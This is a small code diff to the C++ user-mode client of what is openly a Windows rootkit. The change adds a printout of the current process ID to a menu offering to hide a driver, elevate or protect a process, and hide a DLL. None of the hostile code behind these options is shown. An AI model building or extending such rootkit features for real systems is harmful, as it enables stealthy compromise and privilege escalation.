@@ -140,8 +140,8 @@ namespace Rootkit {
         );
     }
 }
-
 void showMenu() {
+    int pid = GetCurrentProcessId();
     std::cout << "===== User Mode Menu =====\n";
     std::cout << "1. Hide Driver\n";
     std::cout << "2. Elevate Process\n";
@@ -149,6 +149,7 @@ void showMenu() {
     std::cout << "4. Protect Process\n";
     std::cout << "5. Hide DLL from process.\n";
     std::cout << "99. Exit\n";
+    std::cout << "Current PID: " << pid << std::endl;
     std::cout << "=======================\n";
     std::cout << "Enter your choice: ";
 }
